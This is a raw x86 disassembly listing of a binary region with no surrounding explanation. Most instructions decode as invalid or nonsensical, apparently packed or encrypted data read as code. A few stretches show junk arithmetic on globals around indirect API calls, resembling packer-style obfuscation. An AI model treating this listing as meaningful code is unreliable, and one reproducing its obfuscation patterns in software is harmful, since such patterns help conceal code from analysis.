  417d0d:	not    bh
  417d0f:	mov    eax,0xf6bbe4fe
  417d14:	pop    esi
  417d15:	repz inc edx
  417d17:	out    dx,al
  417d18:	(bad)  
  417d1a:	add    DWORD PTR [edi+0x9a8be12],ebx
  417d20:	mov    edi,0x9acf0370
  417d25:	pop    ds
  417d26:	ret    
  417d27:	push   eax
  417d28:	ficom  WORD PTR [ecx-0x43ac7442]
  417d2e:	push   ebp
  417d2f:	scas   al,BYTE PTR es:[edi]
  417d30:	pop    ss
  417d31:	shr    DWORD PTR [esi+0x33],1
  417d34:	test   eax,0x591f4848
  417d39:	arpl   WORD PTR [ebx+0x69],di
  417d3c:	jl     0x417cdd
  417d3e:	and    eax,0x5f96e219
  417d43:	inc    eax
  417d44:	jo     0x417cc8
  417d46:	pop    es
  417d47:	outs   dx,BYTE PTR ds:[esi]
  417d48:	(bad)  
  417d49:	retf   
  417d4a:	mov    fs,WORD PTR [ebp+0x1e4d0644]
  417d50:	jo     0x417cdf
  417d52:	aas    
  417d53:	jle    0x417db6
  417d55:	fs je  0x417d49
  417d58:	sbb    eax,DWORD PTR [eax+ebx*1]
  417d5b:	gs xchg esi,eax
  417d5d:	and    esi,DWORD PTR [ebx+edi*8]
  417d60:	shl    DWORD PTR [ebp+0x7f967d53],cl
  417d66:	jle    0x417d4c
  417d68:	sbb    al,0xd3
  417d6a:	push   0xffffffa5
  417d6c:	cli    
  417d6d:	out    0xf7,eax
  417d6f:	xchg   ecx,eax
  417d70:	fidivr DWORD PTR [ebx]
  417d72:	xchg   DWORD PTR [ebx],ecx
  417d74:	pop    edx
  417d75:	add    eax,0xe9dce48a
  417d7a:	leave  
  417d7b:	lods   al,BYTE PTR ds:[esi]
  417d7d:	popa   
  417d7e:	jbe    0x417dd3
  417d80:	hlt    
  417d81:	nop
  417d82:	mov    al,0xe
  417d84:	and    BYTE PTR [eax+0x31],ch
  417d87:	clc    
  417d88:	rol    edi,cl
  417d8a:	sbb    BYTE PTR [ecx-0x574d964a],al
  417d90:	shl    BYTE PTR [ebp+0x62b49710],0x31
  417d97:	(bad)  
  417d98:	nop
  417d99:	push   0x6426489b
  417d9e:	and    BYTE PTR [ecx],0xdf
  417da1:	cmp    DWORD PTR [eax+0x17],ebp
  417da4:	sbb    esi,DWORD PTR [edx-0x710f5dc5]
  417daa:	(bad)  
  417dab:	pop    ss
  417dac:	fldcw  WORD PTR [edx-0x3b]
  417daf:	xor    BYTE PTR [ecx],al
  417db1:	sbb    eax,0xf9b7be25
  417db6:	cs push ss
  417db8:	call   0xa67108c
  417dbd:	sbb    edx,esi
  417dbf:	cmc    
  417dc0:	sub    BYTE PTR [esp+ebp*2-0x5],cl
  417dc4:	push   esp
  417dc5:	sbb    DWORD PTR [esi+0x55],esi
  417dc8:	mov    eax,edi
  417dca:	cdq    
  417dcb:	jmp    0x2b65:0x8b7d0651
  417dd2:	repz xor BYTE PTR [edi],cl
  417dd5:	(bad)  
  417dd6:	sahf   
  417dd7:	and    ebp,0xce7f0315
  417ddd:	bound  esp,QWORD PTR [edx]
  417ddf:	call   0x6110:0x6d8cae2
  417de6:	push   esi
  417de7:	adc    al,BYTE PTR [edx]
  417de9:	(bad)
  417ded:	push   ss
  417dee:	leave  
  417def:	enter  0x875d,0xf4
  417df3:	or     dh,BYTE PTR [esi-0x3c913916]
  417df9:	into   
  417dfa:	cwde   
  417dfb:	mov    DWORD PTR [esi-0x604a7f01],0x6de4920b
  417e05:	mov    BYTE PTR [ebx],dh
  417e07:	add    dl,0x9a
  417e0a:	mov    cl,0xbe
  417e0c:	mov    esi,0xfc64ee8d
  417e11:	or     eax,0xe6bd75bf
  417e16:	clc    
  417e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e18:	mov    edi,0x5ce04396
  417e1d:	popa   
  417e1e:	push   ds
  417e1f:	pusha  
  417e20:	pop    esp
  417e21:	jmp    0x417dc3
  417e23:	mov    cl,0x38
  417e25:	push   es
  417e26:	rcr    BYTE PTR [ebp+0x62faceaa],1
  417e2c:	repnz int3 
  417e2e:	jns    0x417df4
  417e30:	imul   ebp,DWORD PTR [esi+esi*4-0x1f0c8401],0x83bc86fb
  417e3b:	(bad)  
  417e3d:	and    bh,ch
  417e3f:	mov    ebp,0x5a36b841
  417e44:	ds mov bl,0xf1
  417e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e48:	sbb    BYTE PTR [ecx+0x3c],ah
  417e4b:	hlt    
  417e4c:	or     cl,ch
  417e4e:	test   DWORD PTR [ebx+0x50],eax
  417e51:	mov    BYTE PTR [esi-0x1],dl
  417e54:	sub    al,0x2e
  417e56:	jno    0x417df0
  417e58:	inc    ecx
  417e59:	mov    ds:0xf0f540c7,eax
  417e5e:	dec    eax
  417e5f:	test   al,0x3e
  417e61:	inc    eax
  417e62:	jbe    0x417e55
  417e64:	add    al,0xc8
  417e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e67:	test   DWORD PTR [esi-0x11],edi
  417e6a:	cs inc ebp
  417e6c:	outs   dx,DWORD PTR ds:[esi]
  417e6d:	jne    0x417e4e
  417e6f:	push   0xa8647376
  417e74:	jns    0x417e6f
  417e76:	xchg   esp,eax
  417e77:	push   ss
  417e78:	push   edx
  417e79:	cmp    eax,0x84c12ab1
  417e7e:	mov    ch,0xf5
  417e80:	test   ah,bl
  417e82:	push   cs
  417e83:	test   esp,edi
  417e85:	arpl   di,bp
  417e87:	dec    ebx
  417e88:	jmp    0x9e301cb6
  417e8d:	jle    0x417e4b
  417e8f:	loop   0x417eb7
  417e91:	sbb    eax,0xb1902d42
  417e96:	call   0xe7aaef68
  417e9b:	pop    eax
  417e9c:	mov    eax,0xed8032a4
  417ea1:	(bad)  
  417ea2:	retf   0x5df
  417ea5:	push   edx
  417ea6:	out    dx,al
  417ea7:	sub    al,0x62
  417ea9:	jmp    0x417ea7
  417eab:	dec    eax
  417eac:	pop    ebx
  417ead:	cmc    
  417eae:	mov    ds:0xc7bf3034,eax
  417eb3:	inc    esp
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x42836f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428233,0x42828b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428383,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42827f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42837b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428383,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e88
  417f43:	sub    DWORD PTR ds:0x428257,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42823b
  417f53:	mov    ecx,DWORD PTR ds:0x42829b
  417f59:	and    DWORD PTR ds:0x428197,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428373
  417f65:	mov    ecx,DWORD PTR ds:0x428187
  417f6b:	or     DWORD PTR ds:0x42831b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42839f
  417f77:	or     DWORD PTR ds:0x428287,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffff8d
  417f8f:	mov    bl,0x91
  417f91:	jo     0x417fe6
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x73ae1818],bh
  417f9c:	in     al,dx
  417f9d:	cs cli 
  417f9f:	cld    
  417fa0:	cmp    al,0x21
  417fa2:	fisttp WORD PTR [ebx+0x71b565e4]
  417fa8:	mov    ch,0xe5
  417faa:	fsub   QWORD PTR [edi]
  417fac:	xor    al,0xcf
  417fae:	xchg   ebp,eax
  417faf:	pop    esp
  417fb0:	popa   
  417fb1:	iret   
  417fb2:	jno    0x41802c
  417fb4:	pop    ecx
  417fb5:	lea    esp,[edx+0x7a66687a]
  417fbb:	bnd jge 0x417fe9
  417fbe:	aas    
  417fbf:	ja     0x41803a
  417fc1:	dec    eax
  417fc2:	mov    edi,DWORD PTR [edx-0x17]
  417fc5:	out    dx,eax
  417fc6:	into   
  417fc7:	cmp    BYTE PTR [ecx-0x49],ch
  417fca:	add    eax,DWORD PTR [edx+ebp*8]
  417fcd:	and    ebx,ebp
  417fcf:	loope  0x417ff7
  417fd1:	xchg   ecx,eax
  417fd2:	mov    ah,0x30
  417fd4:	inc    edi
  417fd5:	and    ecx,eax
  417fd7:	out    dx,al
  417fd8:	xchg   edx,eax
  417fd9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417fdb:	dec    esi
  417fdc:	mov    BYTE PTR [ebx-0x1f37d91f],dh
  417fe2:	xchg   DWORD PTR [esi+0x1d],esi
  417fe5:	mov    bh,0x59
  417fe7:	popa   
  417fe8:	or     al,0x80
  417fea:	inc    eax
  417feb:	dec    ebp
  417fec:	jge    0x41806b
  417fee:	ficom  WORD PTR [ecx]
  417ff0:	clc    
  417ff1:	call   0x9bf19f86
  417ff6:	cmp    eax,0x177e83c5
  417ffb:	xor    eax,0xc259afa5
  418000:	(bad)  
  418001:	mov    ebp,0xbebba8f1
  418006:	(bad)  
  418007:	daa    
  418008:	int3   
  418009:	dec    eax
  41800a:	call   0x556c:0xc282f523
  418011:	pop    esi
  418012:	push   ds
  418013:	mov    bh,0x61
  418015:	jmp    0xb78253a7
  41801a:	pusha  
  41801b:	or     eax,0xbf62adf7
  418020:	inc    ebp
  418021:	les    edi,FWORD PTR [ecx-0x72]
  418024:	mov    eax,ds:0xe8deeecb
  418029:	jmp    0x269:0x47770d7
  418030:	aaa    
  418031:	mov    ds:0x4f0429e,al
  418036:	leave  
  418037:	fild   QWORD PTR [eax+edx*4-0x5629404f]
  41803e:	(bad)
  418041:	ins    BYTE PTR es:[edi],dx
  418042:	cmp    DWORD PTR [esi+ebp*8-0x6],ecx
  418046:	cdq    
  418047:	lods   eax,DWORD PTR ds:[esi]
  418048:	xchg   ebx,eax
  418049:	out    dx,al
  41804a:	xchg   ebp,eax
  41804b:	cmp    eax,0xf571f914
  418050:	cmp    BYTE PTR [edi],0x7e
  418053:	jbe    0x418023
  418055:	xor    eax,0xea4b203
  41805a:	inc    esp
  41805b:	push   ecx
  41805c:	fmul   DWORD PTR [ebp+0x5a]
  41805f:	jo     0x4180d2
  418061:	addr16 inc esp
  418063:	mov    bh,0x36
  418065:	jl     0x418047
  418067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418068:	jo     0x4180a7
  41806a:	mov    al,BYTE PTR [edi-0x3465d973]
  418070:	mov    ah,0x69
  418072:	adc    eax,0x8073b712
  418077:	shl    esp,0x7b
  41807a:	in     eax,dx
  41807b:	push   ebp
  41807c:	sbb    ecx,DWORD PTR [ebp-0x231561ba]
  418082:	inc    edi
  418083:	inc    edx
  418084:	push   es
  418085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418086:	std    
  418087:	shl    DWORD PTR [eax+0x442a9836],cl
  41808d:	inc    esp
  41808e:	or     DWORD PTR [edi-0x5e2814e1],edx
  418094:	sti    
  418095:	(bad)  
  418096:	stos   DWORD PTR es:[edi],eax
  418097:	push   ebp
  418098:	or     eax,0xa093c175
  41809d:	add    eax,0x6418e4c2
  4180a2:	les    ebx,FWORD PTR [eax+0x4d]
  4180a5:	push   es
  4180a6:	sbb    BYTE PTR [ebp-0x196ccd4],cl
  4180ac:	jl     0x4180b8
  4180ae:	sahf   
  4180af:	in     eax,dx
  4180b0:	(bad)  
  4180b2:	jne    0x418107
  4180b4:	fld    DWORD PTR [ebp-0x6398ba0a]
  4180ba:	adc    DWORD PTR [edx-0x52],ebp
  4180bd:	jo     0x418064
  4180bf:	out    dx,eax
  4180c0:	xchg   edi,eax
  4180c1:	clc    
  4180c2:	push   eax
  4180c3:	jnp    0x4180ce
  4180c5:	adc    eax,0x438ba735
  4180ca:	xchg   DWORD PTR [ecx-0x5c],esp
  4180cd:	or     al,0x59
  4180cf:	xchg   ebp,eax
  4180d0:	and    al,0xd9
  4180d2:	js     0x41813d
  4180d4:	out    0x57,al
  4180d6:	ret    
  4180d7:	and    al,0xfa
  4180d9:	test   al,0x80
  4180db:	push   ecx
  4180dc:	pop    edx
  4180dd:	add    edx,ebp
  4180df:	pop    ds
  4180e0:	cmp    DWORD PTR [eax-0x20b028c2],edx
  4180e6:	jecxz  0x4180c0
  4180e8:	jo     0x418113
  4180ea:	mov    cl,0xe0
  4180ec:	rol    DWORD PTR [ecx],cl
  4180ee:	mov    al,ds:0x377a3c68
  4180f3:	lods   al,BYTE PTR ds:[esi]
  4180f4:	stos   BYTE PTR es:[edi],al
  4180f5:	call   0xf3945fb0
  4180fa:	in     eax,dx
  4180fb:	sbb    esi,ebp
  4180fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180fe:	dec    ebp
  4180ff:	mov    ds:0x8faf5604,eax
  418104:	neg    BYTE PTR [ebx-0x43]
  418107:	out    0x7,eax
  418109:	scas   eax,DWORD PTR es:[edi]
  41810a:	jecxz  0x4180df
  41810c:	xchg   ebp,eax
  41810d:	(bad)  
  41810e:	xor    ch,BYTE PTR [edi-0x68]
  418111:	sbb    BYTE PTR [esi+0x63],ah
  418114:	push   eax
  418115:	sbb    ebp,edx
  418117:	addr16 xor ecx,esp
  41811a:	or     al,0xfc
  41811c:	in     al,dx
  41811d:	fwait
  41811e:	jp     0x4180b6
  418120:	cmp    cl,BYTE PTR [edx+ecx*8]
  418123:	pop    edi
  418124:	cmp    BYTE PTR [ecx-0x65032bd8],dh
  41812a:	ja     0x4180ad
  41812c:	mov    al,ds:0x69492c54
  418131:	lock ficom DWORD PTR [edi]
  418134:	aad    0xa9
  418136:	push   0x7f
  418138:	sti    
  418139:	std    
  41813a:	jecxz  0x41818e
  41813c:	rcl    BYTE PTR [ebp+0x1c],0xd7
  418140:	sti    
  418141:	cmp    bl,BYTE PTR [edx+0x2d]
  418144:	jae    0x4180f7
  418146:	push   ebp
  418147:	lods   al,BYTE PTR ds:[esi]
  418148:	iret   
  418149:	int3   
  41814a:	push   ss
  41814b:	sub    al,0x74
  41814d:	inc    BYTE PTR [esi]
  41814f:	sbb    ebx,edx
  418151:	pop    ecx
  418152:	sbb    ecx,DWORD PTR [ecx]
  418154:	fs in  eax,0x7
  418157:	call   0xda995df6
  41815c:	dec    ebx
  41815d:	push   es
  41815e:	and    DWORD PTR ds:0x18101f6a,ebx
  418164:	rcl    BYTE PTR [edx-0x26f0c703],cl
  41816a:	iret   
  41816b:	mov    bh,BYTE PTR [edi+0x44]
  41816e:	dec    ebp
  41816f:	mov    ah,0xaa
  418171:	ja     0x418190
  418173:	inc    esp
  418174:	mov    bh,0x65
  418176:	std    
  418177:	sbb    DWORD PTR [eax],edx
  418179:	push   ds
  41817a:	push   eax
  41817b:	push   ss
  41817c:	mov    esp,0xeb471b93
  418181:	pop    ds
  418182:	cmp    cl,bl
  418184:	mov    ds:0xfb2dd392,al
  418189:	pop    ebp
  41818a:	into   
  41818b:	fwait
  41818c:	pop    edx
  41818d:	ins    BYTE PTR es:[edi],dx
  41818e:	lods   eax,DWORD PTR ds:[esi]
  41818f:	xchg   esi,eax
  418190:	inc    ebx
  418191:	mov    cs,WORD PTR [ebp-0x34]
  418194:	mov    bh,0xb6
  418196:	stos   BYTE PTR es:[edi],al
  418197:	retf   
  418198:	xchg   esi,eax
  418199:	mov    ?,WORD PTR [edx]
  41819b:	pop    ss
  41819c:	out    dx,al
  41819d:	fimul  DWORD PTR [ebx]
  41819f:	mov    ebx,0x6f3dd746
  4181a4:	and    eax,0xb7c36c4c
  4181a9:	arpl   WORD PTR [edi],bx
  4181ab:	out    dx,al
  4181ac:	scas   eax,DWORD PTR es:[edi]
  4181ad:	or     BYTE PTR [ecx-0x7871163a],ch
  4181b3:	jge    0x418166
  4181b5:	retf   
  4181b6:	jge    0x4181b3
  4181b8:	cli    
  4181b9:	sub    DWORD PTR [edi+esi*4],edx
  4181bc:	retf   
  4181bd:	(bad)  
  4181be:	jno    0x4181d9
  4181c0:	lahf   
  4181c1:	pop    ds
  4181c2:	inc    esp
  4181c3:	mov    eax,ds:0x896519ae
  4181c8:	dec    edx
  4181c9:	or     al,0x6b
  4181cb:	pop    esi
  4181cc:	mov    esp,0x137b7019
  4181d1:	push   0x4c4fea51
  4181d6:	mov    WORD PTR gs:[ebx],ss
  4181d9:	mov    ?,WORD PTR [esi]
  4181db:	mov    esi,0xb8d742cf
  4181e0:	mov    DWORD PTR [edx],ebx
  4181e2:	out    0xf2,al
  4181e4:	lds    edx,FWORD PTR [edx+ebp*8-0x7f]
  4181e8:	(bad)  
  4181e9:	jg     0x4181c4
  4181eb:	pop    es
  4181ec:	xchg   edi,eax
  4181ed:	jl     0x418230
  4181ef:	sbb    bh,dh
  4181f1:	xor    al,BYTE PTR ds:0x370ceafd
  4181f7:	pop    edx
  4181f8:	jmp    0x69b8:0x45157047
  4181ff:	popf   
  418200:	rcl    BYTE PTR [eax+0x4aef5365],1
  418206:	push   0xb68392e1
  41820b:	outs   dx,BYTE PTR ds:[esi]
  41820c:	stos   BYTE PTR es:[edi],al
  41820d:	mov    eax,ds:0xa83c192a
  418212:	(bad)  
  418214:	icebp  
  418215:	mov    eax,0xe8e5e5e7
  41821a:	jns    0x4181fb
  41821c:	outs   dx,BYTE PTR ds:[esi]
  41821d:	or     al,BYTE PTR [esi-0x4f]
  418220:	div    DWORD PTR [esi+0x733c0d9a]
  418226:	rcl    BYTE PTR [ecx-0x447f1c6c],0xad
  41822d:	jecxz  0x418224
  41822f:	call   0x6cf55a86
  418234:	lods   eax,DWORD PTR ds:[esi]
  418235:	xchg   BYTE PTR [edi],dl
  418237:	loop   0x418219
  418239:	mov    ebp,0x9e4032b3
  41823e:	data16 adc cl,BYTE PTR [bp-0xfaa]
  418244:	addr16 imul ebx,edx,0x9f3c80f8
  41824b:	ja     0x4181d4
  41824d:	popa   
  41824e:	sbb    eax,0xfcd3e3b8
  418253:	dec    dh
  418255:	mov    eax,0x4c87d5bf
  41825a:	leave  
  41825b:	lods   eax,DWORD PTR ds:[esi]
  41825c:	mov    eax,ds:0xa5322d21
  418261:	mov    WORD PTR [ecx+0x6a],gs
  418264:	cwde   
  418265:	or     ebx,eax
  418267:	clc    
  418268:	or     eax,0x2d61af3f
  41826d:	jp     0x4182e6
  41826f:	aad    0x27
  418271:	rol    BYTE PTR [ebx+0x46],0x24
  418275:	xchg   edi,eax
  418276:	dec    edi
  418277:	fist   WORD PTR [edx*2+0x5f7f36ad]
  41827e:	jg     0x41826f
  418280:	mov    ds:0xfcbf9ed6,al
  418285:	jle    0x41827a
  418287:	sbb    dl,BYTE PTR [ecx]
  418289:	hlt    
  41828a:	push   ebx
  41828b:	daa    
  41828c:	jae    0x4182c4
  41828e:	mov    WORD PTR [eax+0x546ac961],?
  418294:	(bad)  
  418295:	mov    dl,0x29
  418297:	int3   
  418298:	mov    eax,0xbffcab67
  41829d:	sub    al,BYTE PTR [esi+0x2357ae31]
  4182a3:	cwde   
  4182a4:	push   ss
  4182a5:	inc    esp
  4182a6:	iret   
  4182a7:	(bad)  
  4182a8:	leave  
  4182a9:	inc    BYTE PTR [eax+0x4f]
  4182ac:	aas    
  4182ad:	hlt    
  4182ae:	cld    
  4182af:	dec    ecx
  4182b0:	mov    esi,0x688cdb29
  4182b5:	les    ebx,FWORD PTR [edx+0x2e8b95a6]
  4182bb:	shl    cl,cl
  4182bd:	adc    eax,0xb906b25d
  4182c2:	ins    BYTE PTR es:[edi],dx
  4182c3:	push   ebx
  4182c4:	ret    0x5e5f
  4182c7:	stc    
  4182c8:	jb     0x41827f
  4182ca:	jns    0x4182d0
  4182cc:	aam    0xde
  4182ce:	test   eax,0x98892d3f
  4182d3:	stc    
  4182d4:	stos   DWORD PTR es:[edi],eax
  4182d5:	mov    BYTE PTR [ecx+0x39],bl
  4182d8:	and    al,0xe4
  4182da:	dec    esp
  4182db:	mov    ecx,0xa45f7eb1
  4182e0:	mov    es,ecx
  4182e2:	lea    esi,[edi+0x6d]
  4182e5:	iret   
  4182e6:	mov    ah,0x86
  4182e8:	shl    cl,1
  4182ea:	aad    0xf8
  4182ec:	pop    edx
  4182ed:	pop    esi
  4182ee:	bound  edi,QWORD PTR [edx]
  4182f0:	sar    DWORD PTR [edi-0x7961921],0xe3
  4182f7:	loopne 0x418373
  4182f9:	pop    ss
  4182fa:	mov    dh,0xbc
  4182fc:	sub    eax,0x591e7f61
  418301:	sbb    al,al
  418303:	sar    DWORD PTR [ecx],cl
  418305:	sbb    al,0xcd
  418307:	inc    edx
  418308:	aaa    
  418309:	ins    BYTE PTR es:[edi],dx
  41830a:	or     ebp,esp
  41830c:	adc    ah,cl
  41830e:	mov    ebp,0x895db57d
  418313:	daa    
  418314:	addr16 (bad) 
  418316:	ror    BYTE PTR [edi],cl
  418318:	mov    ch,0xd9
  41831a:	mov    dl,0x29
  41831c:	jp     0x418323
  41831e:	(bad)  
  41831f:	jle    0x418370
  418321:	add    eax,0xe439ebad
  418326:	mov    esi,0x57654b04
  41832b:	std    
  41832c:	push   edx
  41832d:	mov    dh,0xcc
  41832f:	xlat   BYTE PTR ds:[ebx]
  418330:	xchg   ecx,eax
  418331:	(bad)  
  418332:	(bad)  
  418333:	push   esi
  418334:	mov    bh,0xbe
  418336:	les    esi,FWORD PTR [ebx]
  418338:	push   edx
  418339:	xchg   ecx,eax
  41833b:	in     al,0xc1
  41833d:	adc    al,0xb7
  41833f:	inc    esp
  418340:	and    al,0x19
  418342:	div    DWORD PTR [ecx+ecx*4-0x5099f49f]
  418349:	ror    DWORD PTR [ecx-0x74cf0067],0x44
  418350:	and    al,0x34
  418352:	cmp    DWORD PTR ds:0x428187,0x0
  418359:	mov    DWORD PTR ds:0x42824b,0x42c6
  418363:	mov    DWORD PTR ds:0x428387,edx
  418369:	mov    DWORD PTR ds:0x428163,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428287,0x243f
  418382:	mov    DWORD PTR ds:0x42825f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428187,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428323
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e8c
  4183ae:	add    DWORD PTR ds:0x4282ef,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428273
  4183ba:	xor    DWORD PTR ds:0x428327,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428303
  4183c6:	or     DWORD PTR ds:0x42817f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42822b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42822f,0x42819b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42818f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42838f
  418409:	or     DWORD PTR ds:0x428387,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42815f,0x428327
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42822b,0x0
  418430:	mov    DWORD PTR ds:0x42823b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428383,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42822b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428083
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428de8
  41846b:	sbb    DWORD PTR ds:0x42826f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428167,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428383
  418485:	xor    ecx,DWORD PTR ds:0x4282eb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428387,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282ff,0x42826b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283a7,0x42822f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282fb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	sub    ebx,DWORD PTR [edi-0x7f]
  4184fa:	mov    al,0xf6
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x42391818],bh
  418505:	stos   DWORD PTR es:[edi],eax
  418506:	das    
  418507:	pop    edx
  418508:	cs sub eax,0x28ebb1b2
  41850e:	jne    0x41849e
  418510:	ret    
  418511:	jecxz  0x418564
  418513:	mov    al,0xb5
  418515:	add    dh,BYTE PTR es:[esi-0xa]
  418519:	push   es
  41851a:	lods   al,BYTE PTR ds:[esi]
  41851b:	or     esp,ebp
  41851d:	(bad)  
  41851e:	sub    bh,dh
  418520:	add    ebx,ebx
  418522:	repnz mov edi,0x3ff5cb13
  418528:	loopne 0x4184c7
  41852a:	cld    
  41852b:	das    
  41852c:	jg     0x418542
  41852e:	inc    esp
  41852f:	sar    BYTE PTR [edx],0xbf
  418532:	pop    edi
  418533:	xor    eax,0x4dfb902e
  418538:	xchg   edx,eax
  418539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853a:	and    DWORD PTR [ebx-0x29],0x58
  41853e:	xchg   edi,eax
  41853f:	leave  
  418540:	nop
  418541:	bound  ecx,QWORD PTR [eax]
  418543:	dec    ebp
  418544:	and    eax,0x50ff654
  418549:	ins    BYTE PTR es:[edi],dx
  41854a:	mov    fs,WORD PTR [edx+edx*2-0x7e]
  41854e:	retf   0xf5e2
  418551:	pop    ecx
  418552:	pop    ebp
  418553:	xchg   edx,eax
  418554:	xor    ebx,esi
  418556:	sti    
  418557:	adc    ecx,DWORD PTR [eax+ebp*8+0x75]
  41855b:	sbb    BYTE PTR [ecx+0x2ce99f65],al
  418561:	outs   dx,BYTE PTR ds:[esi]
  418562:	mov    ds:0x69120fb8,al
  418567:	push   edx
  418568:	ret    0x1b3f
  41856b:	or     al,0x30
  41856d:	(bad)  
  41856e:	lods   eax,DWORD PTR ds:[esi]
  41856f:	fild   DWORD PTR [ebx]
  418571:	jg     0x41858d
  418573:	sbb    ah,BYTE PTR [eax-0x27]
  418576:	test   BYTE PTR [edx+0x4d0f0e37],0xc4
  41857d:	mov    bh,0x7b
  41857f:	inc    DWORD PTR [eax+ecx*4-0x7d98704f]
  418586:	fisttp DWORD PTR [ebx]
  418588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418589:	sbb    BYTE PTR [ebp+ecx*4+0x402d868a],dh
  418590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418591:	mov    ebx,0xa7ac61ba
  418596:	xchg   edi,eax
  418597:	dec    edx
  418598:	push   esi
  418599:	pop    eax
  41859a:	inc    ebx
  41859b:	loope  0x41859f
  41859d:	daa    
  41859e:	pop    es
  41859f:	call   0xbe7ff4e0
  4185a4:	jmp    0x939:0x27e819f0
  4185ab:	or     bl,BYTE PTR [ecx-0x54]
  4185ae:	sbb    ebp,DWORD PTR [esi+ebx*8]
  4185b1:	and    eax,0xa690f687
  4185b6:	sbb    DWORD PTR [edi-0x5093dd93],0xffffffbd
  4185bd:	dec    ebx
  4185be:	out    dx,al
  4185bf:	out    dx,al
  4185c0:	mov    bh,0x62
  4185c2:	mov    cs,esp
  4185c4:	fmul   QWORD PTR [esi-0x60]
  4185c7:	mov    al,ds:0xd6f07fd1
  4185cc:	lahf   
  4185cd:	fwait
  4185ce:	loope  0x41860c
  4185d0:	loope  0x41863e
  4185d2:	add    edi,DWORD PTR [ebp+0x23]
  4185d5:	or     eax,ebx
  4185d7:	and    BYTE PTR [ebx-0x53],ah
  4185da:	add    eax,0x582e3c97
  4185df:	adc    BYTE PTR [eax+ebp*8+0x1c771054],al
  4185e6:	popa   
  4185e7:	(bad)  
  4185e9:	je     0xf083f297
  4185ef:	jne    0x4185e4
  4185f1:	or     DWORD PTR [edx-0x6cb7f947],eax
  4185f7:	out    0xfa,eax
